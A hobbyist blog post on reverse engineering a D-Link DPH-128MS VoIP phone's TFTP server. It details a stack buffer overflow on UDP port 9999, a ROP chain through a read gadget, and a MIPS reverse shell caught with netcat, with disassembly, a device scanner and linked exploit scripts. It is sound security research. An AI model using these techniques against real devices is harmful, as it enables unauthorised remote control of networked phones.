---
title: D-Link DPH-128MS (Part 2)
categories:
  - Reverse Engineering
tags:
  - Assembly
  - Exploits
  - Linux
  - MIPS
  - Python
---

So i failed to mention with the first post. After I found the `tftpsrv`, the first thing I did was to run the `file` commond on it and I got back this

```
tftpsrv: ELF 32-bit MSB executable, MIPS, MIPS-I version 1 (SYSV)
```

So knowing that, I set out to get some sort of Linux MIPS emulator running. I ended up finding a windows qemu build that supported MIPS [here](http://www.h7.dion.ne.jp/~qemu-win/). I installed a version of Debian that worked for big endian mips.

I used objdump to split the exe into a bunch of text files I could read through. I ended up with the following:

```
tftpsrv.data.txt
tftpsrv.got.txt
tftpsrv.rodata.txt
tftpsrv.strings.txt
tftpsrv.sym.txt
tftpsrv.text.txt
```

The strings file had all sorts of neat things in it, `LEDInit`, `probe_recv(%d)`, tons of other network things, error messages and whatever else. I used a python script to go through my code in [tftpsrv.text.txt](https://github.com/knightsc/tftpsrv/blob/master/tftpsrv.text.txt) and cross reference the strings file to get easier to read assembly. I also parsed the global offset table file and put comments in the assembly from that.

After doing all that I sorta lost interest in the firmware and decided to see if I could find any bugs with the program. So I checked through the symbols file for functions that might have bugs. An easy one to start with is `strcpy`. I wrote a python script called [function_graph.py](https://github.com/knightsc/tftpsrv/blob/master/function_graph.py) that parsed the .text file and generated an image of everything that called `strcpy`

![strcpy graph](/images/strcpy.png){: .align-center}

One of the functions that called `strcpy` was `probe_recv` and for whatever reason it just caught my eye. So I set out to look at `probe_recv` and in turn the function I labeled `run_server`. Well it turned out that `probe_recv` would get called when a packet came in via UDP on port 9999. After looking at `probe_recv` I realized I could send a single '?' to port 9999 and if it was a phone it would respond back with what kind of phone and what version firmware. That's when I wrote the [udp_9999.py](https://github.com/knightsc/tftpsrv/blob/master/udp_9999.py) script to scan for all phones running the specific version of firmware I was looking for.

After looking a little more at `probe_recv` and `run_server`, what stood out to me, instead of the `strcpy` call was this bit of code

```
402360:	27b00020 	addiu	s0,sp,32
402364:	02002021 	move	a0,s0
402368:	00002821 	move	a1,zero
40236c:	24060100 	li	a2,256
402370:	38620040 	xori	v0,v1,0x40
402374:	0002a02b 	sltu	s4,zero,v0
402378:	8f998090 	lw	t9,-32624(gp) 
40237c:	00000000 	nop
402380:	0320f809 	jalr	t9
402384:	00000000 	nop
402388:	8fbc0018 	lw	gp,24(sp)
40238c:	02002021 	move	a0,s0
402390:	26450002 	addiu	a1,s2,2
402394:	2631fffe 	addiu	s1,s1,-2
402398:	02203021 	move	a2,s1
40239c:	8f9980ec 	lw	t9,-32532(gp) 
4023a0:	00000000 	nop
4023a4:	0320f809 	jalr	t9
4023a8:	00000000 	nop
4023ac:	8fbc0018 	lw	gp,24(sp)
4023b0:	02002021 	move	a0,s0
4023b4:	8f858020 	lw	a1,-32736(gp)
4023b8:	00000000 	nop
4023bc:	24a5339c 	addiu	a1,a1,13212    # "DPH-128MS"
4023c0:	02203021 	move	a2,s1
4023c4:	8f9981c8 	lw	t9,-32312(gp) 
4023c8:	00000000 	nop
4023cc:	0320f809 	jalr	t9
4023d0:	00000000 	nop
```

The code was basically doing this

```c
probe_recv(int fd, char *buffer, int sizeofbuffer)
{
  ...
  char localbuffer[256];
  memset(localbuffer, 0, 256);
  memcpy(localbuffer, buffer, sizeofbuffer);
  RC4Crypt(localbuffer, "DPH-128");
  ...
}
```

Ok, this code looked good, it was basically taking whatever size input the function was given and blindly copying it over it's local variable that was on the stack. A classic buffer overflow. After looking back into the run_server function I saw that I was correct.

```
407034:	24060240 	li	a2,576
407038:	8fa402f0 	lw	a0,752(sp)
40703c:	8f93801c 	lw	s3,-32740(gp)
407040:	00000000 	nop
407044:	26731d50 	addiu	s3,s3,7504
407048:	00000000 	nop
40704c:	02602821 	move	a1,s3
407050:	27b000e8 	addiu	s0,sp,232
407054:	02003821 	move	a3,s0
407058:	8f99827c 	lw	t9,-32132(gp) 
40705c:	00000000 	nop
407060:	0320f809 	jalr	t9
407064:	00000000 	nop
407068:	8fbc0018 	lw	gp,24(sp)
40706c:	00409021 	move	s2,v0
407070:	1a400834 	blez	s2,409144 
407074:	02602821 	move	a1,s3
407078:	8fa402f0 	lw	a0,752(sp)
40707c:	02403021 	move	a2,s2
407080:	02003821 	move	a3,s0
407084:	8f998018 	lw	t9,-32744(gp)
407088:	00000000 	nop
40708c: 27392230 	addiu   t9,t9,8752    # 0x402230 probe_recv
407090:	00000000 	nop
407094:	0320f809 	jalr	t9
407098:	00000000 	nop
```

So basically `run_server` was calling `udp_recvfrom` with a buffer that could hold 576 bytes, passing it into `probe_recv` and `probe_recv` then copied it blindly over it's local variable that could only hold 256 bytes. I knew that this was what I needed. I had plenty of room to overlfow the localbuffer and then overwrite the return address that was stored on the stack. The only problem was I didn't really know where to set my return address. I tried randomly picking places in the stack, but the stack was always in a different position and that never worked. I knew Id have to try something else. So I looked into some ROP techniques and decided that I could probably make that work. I also stumbled upon another brilliant article that suggested returning into some place in code that did a `read` call. That way, assuming I controlled what and where was being read I would know where to jump my code to. So two more important long assembly things to note. First, at the end of `probe_recv` in the function epilogue we have this.

```
40280c:	8fbc0018 	lw	gp,24(sp)
402810:	8fbf01e0 	lw	ra,480(sp)
402814:	8fb601d8 	lw	s6,472(sp)
402818:	8fb501d4 	lw	s5,468(sp)
40281c:	8fb401d0 	lw	s4,464(sp)
402820:	8fb301cc 	lw	s3,460(sp)
402824:	8fb201c8 	lw	s2,456(sp)
402828:	8fb101c4 	lw	s1,452(sp)
40282c:	8fb001c0 	lw	s0,448(sp)
402830:	03e00008 	jr	ra
402834:	27bd01e8 	addiu	sp,sp,488
```

This is important because it means that not only was I controlling the `ra` register but also all of the `s` registers. So now I just had to find a `read` call that used the values from the registers. Nothing fancy in this next step, I literally just searched through the .text file looking at all the `read` calls. And bingo

```
40fb70:	04410009 	bgez	v0,40fb98   #JUMP HERE!
40fb74:	02002021 	move	a0,s0
...
40fb98:	02202821 	move	a1,s1
40fb9c:	240600dc 	li	a2,220
40fba0:	8f998048 	lw	t9,-32696(gp) 
40fba4:	00000000 	nop
40fba8:	0320f809 	jalr	t9
40fbac:	00000000 	nop
40fbb0:	8fbc0010 	lw	gp,16(sp)
40fbb4:	0441000d 	bgez	v0,40fbec 
...
40fbec:	8fbf006c 	lw	ra,108(sp)
40fbf0:	8fb10064 	lw	s1,100(sp)
40fbf4:	8fb00060 	lw	s0,96(sp)
40fbf8:	03e00008 	jr	ra
40fbfc:	27bd0070 	addiu	sp,sp,112
```

So couple things to remember here, with the MIPS instruction pipeline, when a branch happens the command after the branch still gets executed. So it just so happens that at the end of `probe_recv` `v0` is greater than 0. So `s0` is our file descriptor, `s1` is our buffer and `a2` always gets set to 220 bytes. So now we jump into read and set the app to wait for our next UDP packet to come in on port 9999. I set the buffer to write to the data segment at `0x10000000` and the second return address was still an address we overwrote in the buffer overflow so I set to to jump into my code at `0x10000000`.

I could now run whatever code I wanted as long as it fit into 220 bytes. I googled some mips reverse connect shell code and pasted it into my [tftpsrv_reverse_shell.py](https://github.com/knightsc/tftpsrv/blob/master/tftpsrv_reverse_shell.py) script. I set up my machine to run netcat listening on port 443, ran my python script and boom, the phone connected back to me.

Quick side note here, it took a lot more time than I just made it out to be to get my shellcode correct. I made it sound easy, but luckily I was able to run the tftpsrv exe in gdb on my qemu machine which made things super nice. I could inspect the stack to figure out my offsets and also test out the reverse connect shellcode. I got it working on my virtual machine and then the first time I ran it on the phone it didn't actually work. Then I realized, the shell code was calling

```c
execve("/bin/sh", NULL, NULL)
```

Which worked fine on my qemu machine but on the phone, which has busybox installed on it, /bin/sh is just a softlink and busybox inspects the argv parameter to figure out what it should actually run. So I changed it to to pass in a valid argv and then everything worked.

Here's the output of dmesg from the phone:

```shell
nc -vv -l 443
Connection accepted
dmesg
**********************
start_cpu_imem = 0x80192000
**********************
Detected SD9218 (PRID: c401),
Revision: 00,
Chip  ID: 00,
16 MB SDRAM.
CPU revision is: 0000c401
64 entry TLB.
Primary instruction cache 8kb, linesize 4 bytes
Primary data cache 8kb, linesize 16 bytes
Linux version:   2009.08.28-10:22+0000
Determined physical RAM map:
 memory: 01000000 @ 00000000 (usable)
Initial ramdisk at: 0x801d0000 (863317 bytes)
On node 0 totalpages: 4096
zone(0): 4096 pages.
zone(1): 0 pages.
zone(2): 0 pages.

=============================
P123_OS V:01.00.05 2007.07.27
=============================
Kernel command line:
Calibrating delay loop... 199.47 BogoMIPS
MIPS CPU counter frequency is fixed at 3125000 Hz
Memory: 13340k/16384k available (1580k kernel code, 3044k reserved, 974k data, 72k init)
Dentry-cache hash table entries: 2048 (order: 2, 16384 bytes)
Inode-cache hash table entries: 1024 (order: 1, 8192 bytes)
Mount-cache hash table entries: 512 (order: 0, 4096 bytes)
Buffer-cache hash table entries: 1024 (order: 0, 4096 bytes)
Page-cache hash table entries: 4096 (order: 2, 16384 bytes)
Checking for 'wait' instruction...  unavailable.
POSIX conformance testing by UNIFIX
PCI: Probing PCI hardware on host bus 0.
PCI: pcibios_fixup_bus
Vendor: 0x1234 Device: 0x5678
Linux NET4.0 for Linux 2.4
Based upon Swansea University Computer Society NET3.039
Initializing RT netlink socket
Starting kswapd
Disabling the Out Of Memory Killer
JFFS2 version 2.1. (C) 2001, 2002 Red Hat, Inc., designed by Axis Communications AB.
SD9218 Uart driver version 0.1 (2003-07-25) with no serial options enabled
ttyS00 at 0xb8000500 (irq = 23) is a SD9218 UART
block: 64 slots per queue, batch=16
RAMDISK driver initialized: 16 RAM disks of 8192K size 1024 blocksize
eth0, irq = 6, io_base = 0xb8001800
eth0: MII PHY found at address 2, status 0x786d advertising 0x05e1 Link 0x41e1.
PPP generic driver version 2.4.2
PPP Deflate Compression module registered
"amd" flash with ID 0x22a7 probed
search_flash_region: part[0] flags=0x00000001
search_flash_region: part[1] flags=0x00000102
search_flash_region: part[2] flags=0x00000040
search_flash_region: part[3] flags=0x00000020
search_flash_region: part[4] flags=0x00000010
search_flash_region: part[5] flags=0x00000000
search_flash_region: part[6] flags=0x00000000
search_flash_region: part[7] flags=0x00000000
search_flash_region: part[8] flags=0x00000000
search_flash_region: part[9] flags=0x00000000
search_flash_region: part[10] flags=0x00000000
search_flash_region: part[11] flags=0x00000000
search_flash_region again for ramdisk+jffs2 case: part[0] flags=0x00000001
search_flash_region again for ramdisk+jffs2 case: part[1] flags=0x00000102
Creating 1 MTD partitions on "sg_flash":
0x00270000-0x003f0000 : "FileSystem"
NET4: Linux TCP/IP 1.0 for NET4.0
IP Protocols: ICMP, UDP, TCP, IGMP
IP: routing cache hash table of 512 buckets, 4Kbytes
TCP: Hash tables configured (established 1024 bind 1024)
EMAC:full_duplex = 1, speed = 1
IP-Config: Incomplete network configuration information.
ip_conntrack (128 buckets, 1024 max)
ip_tables: (c)2000 Netfilter core team
NET4: Unix domain sockets 1.0/SMP for Linux NET4.0.
NET4: Ethernet Bridge 008 for NET4.0
802.1Q VLAN Support v1.6  Ben Greear 
vlan Initialization complete.
RAMDISK: Compressed image found at block 0
Freeing initrd memory: 843k freed
VFS: Mounted root (ext2 filesystem).
Freeing unused kernel memory: 72k freed
Algorithmics/MIPS FPU Emulator v1.5
enter flash_open
flash_open exit!
enter flash_release
enter flash_open
flash_open exit!
enter flash_release
EMAC:full_duplex = 1, speed = 1
VEP_VoIP driver initialized. version 0.0.20, date:2006-09-19
enter flash_open
flash_open exit!
enter flash_release
lcddev: open
lcddev: open
eardev: open
eardev: close

cat /proc/cpuinfo
processor               : 0
cpu model               : R3000 V0.1
BogoMIPS                : 199.47
wait instruction        : no
microsecond timers      : no
extra interrupt vector  : no
hardware watchpoint     : no
VCED exceptions         : not available
VCEI exceptions         : not available
ll emulations           : 69792414
sc emulations           : 69792414
```

So i can now connect to my phone and poke around. I have no way to get new commands on the phone. So far all the internet has turned up is to try to use echo with hex escapes but the busybox version on the phone doesn't support that.

All the files I mentioned in the article including the python exploit can be found here:

[https://github.com/knightsc/tftpsrv](https://github.com/knightsc/tftpsrv)
